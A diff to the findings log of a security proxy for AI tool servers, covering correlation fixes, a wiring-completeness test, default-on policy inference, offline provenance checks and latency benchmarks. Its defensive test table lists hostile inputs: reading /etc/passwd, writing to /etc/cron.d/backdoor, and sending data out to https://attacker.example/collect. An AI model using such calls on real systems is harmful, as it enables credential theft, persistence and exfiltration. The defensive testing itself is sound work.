@@ -481,7 +481,7 @@ Closed in two halves, because the scope arrives from two places:
   lands, the guards forward `ctx.authorizationScope` into the third parameter and nothing else
   changes. The parameter is optional, so no existing implementation breaks.
 
-### C-19 · `resources/read` and `prompts/get` results pop the `tools/call` correlation queue — OPEN, Dev 3
+### C-19 · `resources/read` and `prompts/get` results pop the `tools/call` correlation queue — RESOLVED (Week 3)
 Surfaced by wiring C-12, not by unit tests. `ResultGuard.#onResult()` calls `#correlate(ctx)`
 unconditionally, but `#onResult` now handles all three of `RESULT_METHODS`. A `resources/read`
 result arriving while a `tools/call` is in flight pops the pending `tools/call` entry, so that call's
@@ -492,11 +492,16 @@ Bounded, and fail-safe: it is unreachable with sequential traffic (the queue is 
 documents — the guard declines to enforce and emits `toolwall/result.uncorrelated`. So this widens
 a known gap rather than opening a new one, and it does not change fail-open/fail-closed.
 
-Left for Dev 3 rather than patched across the boundary, because the fix is a one-line guard in an
-actively-edited file and it needs a unit test that only makes sense next to the others:
+The fix is the one line Dev 3 specified, now in `ResultGuard.#onResult`:
 ```ts
 const correlated = ctx.method === "tools/call" ? this.#correlate(ctx) : undefined;
 ```
+Three tests in `test/unit/result-guard.test.ts` cover it, and two of them **fail against the old
+line** — verified by reverting it — so they capture the defect rather than describing it: a
+`resources/read` result and a `prompts/get` result each arriving mid-flight no longer consume the
+pending `tools/call`, whose `outputSchema` is still enforced when its own result lands. The third
+asserts the scoping is confined to correlation: the size caps and the `__proto__` scan still run on
+all three result methods, because they need no correlation to be meaningful.
 
 ### C-20 · Replay of "read-only" methods is not free, and the comment said it was — CORRECTED
 `src/transport/reconnect.ts` described the replayed methods as having re-execution that is
@@ -568,3 +573,158 @@ catches **0 of 8** published tool-poisoning payloads at 0.0% FP; `alert` catches
 Shipping the enforcing lane on by default would block nothing that matters while being loud about
 the rest — theatre. The mode is `advisory` regardless of lane: findings reach stderr and the audit
 log, the verdict stays `allow`.
+
+---
+
+## Week-3 integration outcomes (2026-08-19) — inference, provenance, and the recurrence
+
+### C-22 · ITEM ZERO, THIRD OCCURRENCE: `infer.ts` and `provenance.ts` were dead code — RESOLVED
+`grep inferredPolicy src/index.ts` and `grep provenanceObserver src/index.ts` both returned
+nothing. `src/policy/infer.ts` (827 lines) and `src/audit/provenance.ts` (1,621 lines) were not
+imported, not exported and not reachable from any request path. Both had green unit tests. Nothing
+failed, because a module nobody imports raises no error.
+
+That is the same failure as C-17 (the whole Week-2 response leg) and the same failure as the Week-1
+double `deriveServerId` (C-0). Three occurrences is not a lapse, it is a missing check.
+
+**Wired:**
+- `assembleToolwall()` now builds `policy` **after** `tools`, because inference must read the
+  PINNED `inputSchema` per C-1, and wraps it: `inferredPolicy(base, tools, { roots: [baseDir] })`.
+  Default-ON, `observation` left `"off"`.
+- `provenanceObserver({ identity, audit: audit.sink(), provenance }).observe` is wired into
+  `MetadataPinGuardOptions.onEvent`, constructed only when `ToolwallOptions.provenance` is given.
+- Both modules are re-exported from `src/index.ts`; the CLI gained `--no-inference` and the five
+  provenance flags, and `parseProvenanceArgs` is called on the argv slice **before** `--` so a
+  flag belonging to the upstream server's own command line cannot switch ours on.
+
+**The structural fix, generalised — `test/integration/wiring-completeness.test.ts`.** C-17's
+assembly-time throw is kept (it fails at startup, which is stronger than failing in a test run) but
+it knows about exactly one guard. The general form is a manifest: every module under `src/guards/`,
+`src/policy/` and `src/audit/` must be classified `assembled`, `opt-in`, `support` or `barrel`, and
+the classification is verified against the code:
+
+| claim | verified by |
+|---|---|
+| `assembled` | import-reachable from `src/index.ts`, a symbol of it appears inside `assembleToolwall()`, and it is on the public export surface |
+| `opt-in` | all of the above, **plus** the `ToolwallOptions` field that enables it exists in `src/index.ts` — "opt-in" cannot quietly mean "unreachable" |
+| `support` | import-reachable from `src/index.ts` |
+| `barrel` | contains no runtime code |
+
+A new file under those directories fails the suite until somebody classifies it; a module that is
+neither reachable nor declared opt-in fails it. **Both Week-3 modules would have failed the
+reachability check on the day they landed.** Verified by adding a dead `src/policy/dead-experiment.ts`
+and watching the suite go red, then removing it.
+
+What it does not claim: that a reachable module is correct, or that a guard is registered on the
+right leg. `response-guards-e2e.test.ts` and `inference-provenance-e2e.test.ts` prove behaviour.
+This file proves only that nothing on disk was silently forgotten.
+
+### C-23 · Inference is wired, default-ON, and proven end to end
+`test/integration/inference-provenance-e2e.test.ts` drives a real spawned fixture
+(`test/fixtures/capability-server.mjs` — an entirely legitimate server) through the assembled
+proxy. Every "with inference" assertion is **paired with the same call under
+`enable: { inference: false }`**, so the improvement is measured against the real day-zero
+baseline rather than asserted against nothing:
+
+| call, with NO policy file | inference ON | inference OFF (what Week 2 shipped) |
+|---|---|---|
+| `read_file({ path: "/etc/passwd" })` | **blocked on the request leg** | allowed, `read:/etc/passwd` returned |
+| `write_file({ destination: "/etc/cron.d/backdoor" })` | **blocked** | allowed, `wrote:` returned |
+| `fetch_url({ url: "file:///etc/passwd" })` | **blocked** (scheme) | allowed, `fetched:` returned |
+| `fetch_url({ url: "https://attacker.example/collect" })` | allowed — the documented gap | allowed |
+
+The last row is asserted as a **miss**, not omitted: inference cannot invent a host allowlist, and
+a declared `egress` block is still what catches exfiltration to an unlisted host. The same test
+proves that block works, so the README's "inference is a floor, not a ceiling" is a measured claim.
+
+False-positive side, also through the assembled proxy: a read inside the workspace root, a
+two-number `add`, `http://127.0.0.1:3000`, and the C-7 `git_diff` anchor case are all untouched.
+The full suite — 846 tests including the 59-case benign corpus and the whole Week-1/2 e2e set —
+passes unchanged with inference default-ON, which is the strongest available restatement of the
+0.0% false-positive measurement.
+
+**Precedence verified through the assembled path, not against the module.** A policy declaring
+`filesystem.read: ["/etc"]` for this server makes `read_file({ path: "/etc/passwd" })` succeed, and
+in the same session `fetch_url({ url: "file://..." })` is still blocked — inference stands down per
+capability, not wholesale.
+
+### C-24 · Provenance is opt-in, and the default path makes zero network calls
+Asserted against the **real global `fetch`**, replaced with a recorder for the duration of a full
+assembled session, rather than against an injected `fetchImpl`. An injected stub cannot observe a
+call made by something that never took one, and the claim being defended is about the binary.
+
+- No `provenance` option: `toolwall.provenance` is `undefined`, no `toolwall/provenance-*` finding
+  appears anywhere, zero fetch attempts.
+- `provenance: { network: "offline" }`: a real `pinned` event from the real pin guard drives the
+  observer, `toolwall/provenance-not-checked` reaches the real audit sink, zero fetch attempts.
+- A `server.json` `fileSha256` against a real local artifact produces
+  `provenance-file-hash-verified`, and against tampered bytes `provenance-file-hash-mismatch`
+  (`critical`) — fully offline, fully deterministic, and the one check in the module entitled to
+  the word "verified".
+- `network: "allow-registry-lookups"` changes the `not-checked` **reason** from *"registry lookups
+  are off"* to *"no package could be resolved from the spawn spec"*, which is what proves the flag
+  propagated through argv → `parseProvenanceArgs` → `assembleToolwall` → the observer rather than
+  being dropped somewhere in between.
+
+`--provenance-bundle` alone turns the feature on and leaves the network off; the CLI banner says
+which of the two postures you are in, and `test/integration/cli.test.ts` asserts both strings.
+
+### C-11 (re-measured, Week 3) · The 5 ms budget is MISSED on a node-heavy result
+The C-11 follow-up asked for `measure()` and `hasProtoKey()` to be fused, predicting it "would
+roughly halve the large-result cost". **The prediction was wrong, for a reason worth recording:**
+`bench/latency.ts`'s `large` workload is 64 KiB arriving as ONE string inside two objects — about
+six nodes. Both walks finish it in microseconds however many times they run. The response-leg cost
+scales with a result's **node count**, not its byte size, and the benchmark had no node-heavy case.
+
+So the benchmark gained a third workload, `wide`: 2,000 structured rows (~12k nodes, ~219 KiB),
+which is what a SQL, search or directory-listing tool actually returns.
+
+`npm run bench`, Node v25.2.1 on darwin/x64, 1000 sequential `tools/call` after 100 warmup, one in
+flight, **four consecutive runs** at load average 6–13. Added latency vs a direct connection:
+
+| workload | added p50 | added p95 | added p99 | budget |
+|---|---|---|---|---|
+| small (9 B) | +0.177 … +0.289 ms | +0.269 … +0.368 ms | +0.349 … +0.401 ms | within |
+| large (64 KiB, ~6 nodes) | +0.822 … +0.920 ms | +1.524 … +1.736 ms | +0.907 … +1.722 ms | within |
+| **wide (~12k nodes)** | **+4.235 … +4.448 ms** | **+4.657 … +5.745 ms** | **+5.123 … +7.260 ms** | **OVER on all four runs** |
+
+Guard stack alone (guarded minus zero-guard proxy), so the process hop is excluded:
+
+| workload | p50 | p95 | p99 |
+|---|---|---|---|
+| small | −0.176 … +0.103 ms | −0.366 … +0.074 ms | −0.809 … +0.071 ms |
+| large | +0.105 … +0.176 ms | +0.495 … +0.688 ms | +0.469 … +0.726 ms |
+| wide | +1.346 … +1.577 ms | +1.472 … +2.532 ms | +0.175 … +3.305 ms |
+
+The negative `small` figures are noise, not a discovery: on a 9-byte echo the guarded proxy and the
+zero-guard proxy differ by less than the run-to-run spread, and in one of the four runs the
+zero-guard proxy happened to be the slower of the two. Reported as measured rather than clipped
+at zero.
+
+**Read the two tables together.** On the `wide` workload the *zero-guard* proxy alone adds p99
++3.955 … +5.515 ms — the extra process hop and the JSON re-serialization of a 219 KiB structured
+payload consume most or all of the budget before a single guard runs. The guard stack's own p50
+contribution is ~1.3–1.6 ms. **`npm run bench` now exits non-zero, and that is correct: the
+sub-5 ms p99 claim does not hold for large structured results and should not be made.** It holds
+comfortably for the small and byte-heavy cases, which is what the earlier tables measured.
+
+**Did the fusion help? Yes, but not where C-11 predicted, and not measurably in the full-stack
+benchmark.** The end-to-end run-to-run variance on `wide` (±2 ms on the guard-stack delta at load
+8–13) is an order of magnitude larger than the effect, so the full-stack bench cannot resolve it —
+before/after runs there were indistinguishable. Isolated, 20,000 iterations after 2,000 warmup on
+the same host:
+
+| payload | two walks (`measure` + `hasProtoKey`) | one walk (`measureAndScan`) | change |
+|---|---|---|---|
+| 64 KiB in ONE string (~6 nodes) | mean 0.0014 ms | mean 0.0014 ms | **−2.8%, i.e. nothing** |
+| 12,007 nodes / 219 KiB | mean 1.0411 ms, p99 1.3881 ms | mean 0.8313 ms, p99 1.0515 ms | **−20.2% mean, −24% p99** |
+
+`measureAndScan` also drops the per-node `{ v, d }` frame allocation in favour of two parallel
+stacks, and turns the `__proto__` check into one `hasOwnProperty` call per object instead of a
+second traversal and a second `getOwnPropertyNames` allocation. The proto scan now shares
+`measure`'s 200k node cap rather than its own 50k one, which is four times the coverage in the same
+fail-open direction. `hasProtoKey` stays exported and tested; it is simply no longer on the hot
+path.
+
+Still not measured, and therefore still not claimed: concurrency, a cold pin store on a slow disk,
+and the `tools/list` cold path.
